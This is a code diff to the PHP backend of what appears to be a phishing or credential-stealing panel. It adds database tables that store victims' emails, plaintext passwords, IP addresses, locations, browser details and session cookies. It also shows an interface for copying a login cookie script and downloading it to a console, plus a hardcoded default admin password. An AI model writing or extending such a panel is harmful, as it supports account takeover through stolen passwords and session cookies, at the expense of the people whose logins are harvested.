@@ -5,7 +5,64 @@ session_start();
 $dsn = 'sqlite:' . __DIR__ . '/passwords.db';
 try {
     $db = new PDO($dsn);
+
     $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+    // Auto-initialize tables if they don't exist
+    $db->exec("CREATE TABLE IF NOT EXISTS users (
+        id INTEGER PRIMARY KEY, 
+        password TEXT,
+        secret_2fa TEXT
+    )");
+
+    $db->exec("CREATE TABLE IF NOT EXISTS accounts (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        email TEXT NOT NULL,
+        password TEXT NOT NULL,
+        ip_address TEXT,
+        location TEXT DEFAULT 'Unknown',
+        browser TEXT,
+        os TEXT,
+        service_type TEXT,
+        cookies_json TEXT,
+        cookies_json_export TEXT,
+        cookie_script TEXT,
+        verified INTEGER DEFAULT 0,
+        favorite INTEGER DEFAULT 0,
+        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )");
+
+    $db->exec("CREATE TABLE IF NOT EXISTS settings (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        setting_key TEXT UNIQUE NOT NULL,
+        setting_value TEXT,
+        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
+    )");
+
+    // Ensure columns exist (for migration)
+    try {
+        $db->exec("ALTER TABLE accounts ADD COLUMN cookies_json_export TEXT");
+    } catch (PDOException $e) {
+    }
+    try {
+        $db->exec("ALTER TABLE users ADD COLUMN secret_2fa TEXT");
+    } catch (PDOException $e) {
+    }
+
+    // Create indexes
+    $db->exec("CREATE INDEX IF NOT EXISTS idx_email ON accounts(email)");
+    $db->exec("CREATE INDEX IF NOT EXISTS idx_service_type ON accounts(service_type)");
+
+    // Default user
+    $stmt = $db->query("SELECT COUNT(*) FROM users");
+    if ($stmt->fetchColumn() == 0) {
+        $defaultPassword = password_hash('HitTheGroundRunning.exe', PASSWORD_BCRYPT);
+        $stmt = $db->prepare("INSERT INTO users (password) VALUES (:password)");
+        $stmt->bindParam(':password', $defaultPassword);
+        $stmt->execute();
+    }
+
 } catch (PDOException $e) {
     die("Database connection failed: " . $e->getMessage());
 }
@@ -1183,7 +1240,8 @@ $telegram_chat_id = getSetting($db, 'telegram_chat_id');
                             <div class="info-row">
                                 <div class="info-label">Location:</div>
                                 <div class="info-value">
-                                    <?php echo htmlspecialchars($selected_account['location'] ?: 'Unknown'); ?></div>
+                                    <?php echo htmlspecialchars($selected_account['location'] ?: 'Unknown'); ?>
+                                </div>
                             </div>
                             <div class="info-row">
                                 <div class="info-label">Browser & OS:</div>
@@ -1221,7 +1279,8 @@ $telegram_chat_id = getSetting($db, 'telegram_chat_id');
                             <div class="details-section">
                                 <h3><span class="icon">🍪</span> Login Cookies (Recommended)</h3>
                                 <div class="cookie-code" id="cookie-code">
-                                    <?php echo htmlspecialchars($selected_account['cookie_script']); ?></div>
+                                    <?php echo htmlspecialchars($selected_account['cookie_script']); ?>
+                                </div>
                                 <div class="action-buttons">
                                     <button class="action-btn btn-copy" onclick="copyCookie()">Copy Cookie</button>
                                     <button class="action-btn btn-download-console" onclick="downloadConsole()">Download
